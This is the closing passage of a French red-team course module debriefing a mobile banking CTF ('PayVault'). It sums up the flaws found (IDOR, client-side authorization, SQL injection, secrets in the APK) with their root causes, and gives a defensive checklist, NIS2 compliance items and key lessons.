│  ┌────────────────────────────────────────────────────────────┐ │
│  │ • Flag 3 : IDOR — pas de vérification d'appartenance       │ │
│  │ • Flag 5 : Vérification admin côté client (ignorée)        │ │
│  │                                                            │ │
│  │ → Cause racine : autorisation déléguée au client            │ │
│  │ → Règle d'or : TOUTE autorisation doit être serveur-side   │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  INJECTION                                                        │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ • Flag 4 : SQL Injection via paramètre de recherche        │ │
│  │                                                            │ │
│  │ → Cause racine : concaténation de chaînes dans SQL         │ │
│  │ → Règle d'or : Requêtes paramétrées, TOUJOURS              │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 7.2 Top 5 des bonnes pratiques

| # | Bonne pratique | Flag(s) | Impact |
|---|---------------|---------|--------|
| 1 | **Ne jamais stocker de secrets dans le code client** | 1, 5 | L'APK est publique, tout est accessible |
| 2 | **Toute autorisation vérifiée côté serveur** | 3, 5 | Le client est contrôlé par l'attaquant |
| 3 | **Requêtes paramétrées (Prepared Statements)** | 4 | Seule défense fiable anti-SQLi |
| 4 | **SSL Pinning = couche, pas solution** | 2 | Combiner avec Play Integrity, CT |
| 5 | **Séparer les environnements (dev/staging/prod)** | 1 | Les secrets de dev ne doivent pas fuiter |

### 7.3 Checklist sécurité mobile (résumé exécutif)

```markdown
## Checklist sécurité application mobile bancaire

### Stockage des données
- [ ] Aucun secret dans le code source ou les ressources
- [ ] Utilisation de BuildConfig/keystore pour l'environnement
- [ ] Chiffrement des données locales (SQLCipher, EncryptedSharedPrefs)
- [ ] Pas de logs en production (ou logs caviardés)

### Communication réseau
- [ ] HTTPS avec certificats valides (pas de self-signed en prod)
- [ ] SSL Pinning avec Network Security Config
- [ ] Certificate Transparency vérifié
- [ ] Tokens JWT avec expiration courte et rotation

### Authentification et autorisation
- [ ] Authentification multifacteur (MFA) pour opérations sensibles
- [ ] Vérification serveur-side de TOUS les rôles et permissions
- [ ] ID non séquentiels (UUID) pour les ressources
- [ ] Rate limiting sur les endpoints sensibles
- [ ] Logging des tentatives d'accès non autorisées

### Résilience anti-tampering
- [ ] Play Integrity API activée (vérification runtime)
- [ ] Détection root / Frida / Magisk
- [ ] Vérification de signature APK
- [ ] Obfuscation R8/ProGuard activée en release
- [ ] Détection émulateur pour endpoints critiques

### Backend
- [ ] Requêtes paramétrées (anti-SQLi)
- [ ] Validation des entrées (allowlist, pas denylist)
- [ ] WAF devant l'API
- [ ] Audit des logs d'accès
- [ ] Tests de sécurité automatisés dans la CI/CD

### Conformité NIS2
- [ ] Article 21.2(c) : Continuité — plan de réponse incident
- [ ] Article 21.2(i) : Politiques de sécurité pour le développement
- [ ] Article 21.2(g) : Tests de sécurité réguliers (Red Team inclus)
- [ ] Article 21.2(e) : Sécurité de la chaîne d'approvisionnement logicielle
```

### 7.4 Messages clés à retenir

```
┌──────────────────────────────────────────────────────────────────┐
│                   LEÇONS ESSENTIELLES — CTF PAYVAULT              │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. LE CLIENT N'EST JAMAIS DE CONFIANCE                          │
│     Tout ce qui est dans l'APK est accessible à l'attaquant.     │
│     Toute vérification client-only sera contournée.              │
│                                                                  │
│  2. LA SÉCURITÉ MOBILE EST UNE SÉCURITÉ SYSTÈME                 │
│     L'application n'est qu'une interface vers le backend.        │
│     La vraie sécurité est côté serveur.                          │
│                                                                  │
│  3. L'ATTAQUE COMMENCE PAR L'ANALYSE STATIQUE                    │
│     Avant même d'exécuter l'application, un attaquant peut       │
│     extraire secrets, endpoints, logique métier via jadx.        │
│                                                                  │
│  4. UNE SEULE FAILLE SUFFIT                                      │
│     Les 5 flags forment une chaîne : chaque compromission        │
│     facilite la suivante. C'est l'effet domino.                  │
│                                                                  │
│  5. LA DÉFENSE EN PROFONDEUR EST INDISPENSABLE                   │
│     Aucune couche n'est suffisante seule. Il faut combiner       │
│     obfuscation, anti-tampering, Play Integrity, JWT signé,      │
│     ET SURTOUT vérification serveur-side systématique.           │
│                                                                  │
│  6. DOCUMENTER AVEC MITRE ATT&CK                                 │
│     Le mapping ATT&CK permet de communiquer efficacement         │
│     avec les équipes Blue Team et la direction.                  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

**Fin du Module 15 — Débrief CTF & Corrections : Opération "PayVault"**

*Document rédigé pour le cursus M2 Red Team — SDV 2026*
*Toutes les techniques présentées doivent être utilisées uniquement dans un cadre légal et autorisé (test d'intrusion, Red Team avec ROE signées).*
